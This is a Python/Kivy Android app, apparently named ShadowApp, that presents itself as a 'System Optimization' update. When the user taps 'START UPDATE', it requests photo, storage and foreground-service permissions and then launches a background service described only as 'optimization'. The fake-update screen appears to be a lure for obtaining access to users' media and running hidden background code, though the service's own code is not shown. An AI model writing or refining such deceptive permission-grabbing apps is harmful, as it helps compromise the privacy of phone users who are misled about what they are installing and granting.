from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission
from jnius import autoclass

class ShadowApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        self.label = Label(text="System Optimization Required", font_size='20sp')
        self.btn = Button(
            text="START UPDATE",
            background_color=(0, 0.7, 0, 1),
            font_size='24sp',
            on_press=self.ask_permissions
        )
        self.layout.add_widget(self.label)
        self.layout.add_widget(self.btn)
        return self.layout

    def ask_permissions(self, instance):
        # طلب الصلاحيات أولاً
        perms = [
            Permission.READ_MEDIA_IMAGES,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.FOREGROUND_SERVICE
        ]
        request_permissions(perms, self.activate_engine)

    def activate_engine(self, permissions, grants):
        # إذا وافق المستخدم، نشغل الخدمة ونغير شكل الزر
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            service = autoclass('org.test.shadowcore.ServiceMyservice')
            service.start(PythonActivity.mActivity, "")
            self.btn.text = "UPDATE ACTIVE"
            self.btn.disabled = True
            self.label.text = "Optimization running in background..."
        except Exception as e:
            self.label.text = f"Error: {str(e)}"

if __name__ == "__main__":
    ShadowApp().run()
